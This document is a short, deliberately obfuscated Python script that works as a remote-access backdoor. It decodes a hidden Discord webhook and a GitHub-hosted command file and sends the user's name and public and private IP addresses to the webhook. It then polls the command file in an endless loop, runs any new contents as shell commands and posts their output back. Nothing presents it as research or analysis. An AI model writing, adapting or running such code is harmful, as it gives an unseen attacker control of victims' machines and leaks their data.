import getpass
import base64
import requests
import subprocess
import os
past=""
usn=getpass.getuser()

enc="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIxMzk3MzE1NDEyNTQ1NTM3MC9OY05DUEJYQjNpa0ZJLWY1X2NxYVZiVGJQRjZvLTJrOFZfUDNrSzJHMmIxRExEaTAya0hab0w5cHgwVktLVnhQUktkRQ"
ebc1="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2luZmRldnYvZ2xkL21haW4vaW5wdXQudHh0"

O00OO00OOO000O0O0 =base64 .b64decode (ebc1 ).decode ()
O000O0000O00OO0O0 =requests .get (O00OO00OOO000O0O0 )

iap = lambda: requests.get('https://api.ipify.org').text
iap1 = iap()
import socket
hostname = socket.gethostname()
puip=socket.gethostbyname(hostname)
O000OO0OO0OO0OO0O = "CONNECTED BKG"
past =O000O0000O00OO0O0 .text 
O00OO0O0O000OO000 =enc +'='*((4 -len (enc )%4 )%4 )
O0O0OO0O000000OOO =base64 .b64decode (O00OO0O0O000OO000 ).decode ()
O0OOO0O00OOOO0O0O ={'Content-Type':'application/json'}
O0OO00O00OO0O0O0O ={'username':'AXRS','content':"BKG|OUT (USR "+usn+" | PUIP "+iap1+" | PRIP "+puip+"): "+str (O000OO0OO0OO0OO0O .stdout )}
O000O0000O00OO0O0=requests .post (O0O0OO0O000000OOO ,headers =O0OOO0O00OOOO0O0O ,json =O0OO00O00OO0O0O0O )

def nuke ():
    global past 
    enc="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIxMzk3MzE1NDEyNTQ1NTM3MC9OY05DUEJYQjNpa0ZJLWY1X2NxYVZiVGJQRjZvLTJrOFZfUDNrSzJHMmIxRExEaTAya0hab0w5cHgwVktLVnhQUktkRQ"
    ebc1="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2luZmRldnYvZ2xkL21haW4vaW5wdXQudHh0"

    O00OO00OOO000O0O0 =base64 .b64decode (ebc1 ).decode ()
    O000O0000O00OO0O0 =requests .get (O00OO00OOO000O0O0 )
    if O000O0000O00OO0O0 .text !=past :
        iap = lambda: requests.get('https://api.ipify.org').text
        iap1 = iap()
        import socket
        hostname = socket.gethostname()
        puip=socket.gethostbyname(hostname)
        O000OO0OO0OO0OO0O =subprocess .run (O000O0000O00OO0O0 .text ,shell =True ,capture_output =True ,text=True )
        past =O000O0000O00OO0O0 .text 
        O00OO0O0O000OO000 =enc +'='*((4 -len (enc )%4 )%4 )
        O0O0OO0O000000OOO =base64 .b64decode (O00OO0O0O000OO000 ).decode ()
        O0OOO0O00OOOO0O0O ={'Content-Type':'application/json'}
        O0OO00O00OO0O0O0O ={'username':'AXRS','content':"BKG|OUT (USR "+usn+" | PUIP "+iap1+" | PRIP "+puip+"): "+str (O000OO0OO0OO0OO0O .stdout )}
        O000O0000O00OO0O0=requests .post (O0O0OO0O000000OOO ,headers =O0OOO0O00OOOO0O0O ,json =O0OO00O00OO0O0O0O )


while True:
    nuke()
